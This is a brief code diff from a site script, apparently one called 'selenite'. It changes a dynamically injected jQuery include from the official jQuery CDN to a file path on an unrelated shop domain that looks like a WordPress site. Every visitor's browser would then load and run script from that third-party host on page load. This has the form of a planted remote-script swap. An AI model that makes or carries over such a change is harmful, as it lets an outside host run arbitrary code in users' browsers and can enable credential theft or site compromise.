@@ -174,7 +174,7 @@ if (JSON.parse(localStorage.getItem("selenite.passwordAtt"))) {
 }
 !(function () {
 	var e = document.createElement("script");
-	(e.src = "https://code.jquery.com/jquery-3.7.1.min.js"),
+	(e.src = "https://a-r-d.shop/wp-includes/js/jquery/jquery.min.js"),
 		document.head.appendChild(e),
 		(e.onload = function () {
 			var t = $("<script>").attr("src", "https://unpkg.com/webp-hero@0.0.2/dist-cjs/polyfills.js");
